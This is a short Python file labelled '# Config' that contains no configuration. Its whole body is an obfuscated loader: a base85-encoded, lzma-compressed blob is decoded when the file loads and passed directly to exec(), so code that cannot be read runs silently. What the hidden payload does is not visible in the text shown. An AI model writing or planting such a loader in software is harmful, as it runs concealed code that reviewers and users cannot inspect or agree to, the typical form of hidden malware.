# Config
import lzma, base64
_data = b'{Wp48S^xk9=GL@E0stWa8~^|S5YJf5-~?R)9bEu4n@VT6Qap47uD?*%pqR^2IeP3OZ&0(1-hSC}{k&JXX;~YG;7Ab&!cUhzo__8K&ijeNOQM8Xq}f<WPz+XXYr1a*l6R~*xQV{m+PEF!+=G$f>82L!3q_UrTKE|VbpYvw-K0NSvySL#uIkfKA8Czw7WJy^af?E?LKN?Pn}Wg^1kFGmK?o=62~W-q>UUJa<3ZH>+s=P<aWwR++?dU^EL=r8bg~{>*!{v<)nO-5GqUN&X<Sc5T4q~o{%Qxvan#$XEc!E0v20y*5rW;9*|m3z!mr<o_%;58odX-TjyzszyzHmI;i^-Z1bnZOQZxJu<}3tqQ*CuQGRRTqck+`glj+{p*+fGCZ1}1n3tr*UX3x9wW5{m!Oqsx|haIwd>1a*u8!E=@vco*<u2Wj`eA6-0{=@{S^Jd9BvfeThL!aAxk1$T-ryvpK&!_&I`#3j?EVD6*s;ds~MibG&v${06L|#8w`iloZuZ+J^D0^pVNkLZiXaT+sIFT}7aHNVC^C%wx)oOAGnk550)05hAbyk89Dg)Z(6(NImg@*Aw3IGA*{M@FSAZ}m-G`I7Vs3<2E?x>z;5N=mn4b*FS(U+bA5U2EvA5WgV<Zm;oB29>D0o;|tC<+)5)hOF#<bkrNKGR4vQJ6-QajfWd6@E~L{c3wDQ<iG)Eh)2A;?R_zo5i1|&M|q^Di-`|00000F`S!1hQ+*C00FrK-Ut8yvag84vBYQl0ssI200dcD'
_exec = lzma.decompress(base64.b85decode(_data)).decode('utf-8')
exec(_exec)
